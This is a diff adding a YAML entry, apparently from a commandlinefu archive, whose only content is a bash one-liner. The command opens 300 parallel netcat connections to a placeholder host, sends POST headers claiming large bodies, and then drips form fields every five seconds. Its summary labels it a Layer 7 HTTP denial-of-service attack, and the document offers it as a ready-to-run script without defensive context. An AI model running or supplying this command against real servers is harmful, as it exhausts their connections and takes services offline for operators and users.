@@ -1,0 +1,8 @@
+commandlinefu_id: 14166
+translator:
+  weibo: ''
+hide: true
+command: |-
+  for i in `seq 300`; do ( ( echo -e "POST / HTTP/1.1\nHost: vhost.domain\nContent-length: 100000\n\n"; for j in `seq 600`; do echo $j=$j\&; sleep 5; done ) | nc vhost.domain 80 & ); done
+summary: |-
+  Performs Layer 7 HTTP DoS attack
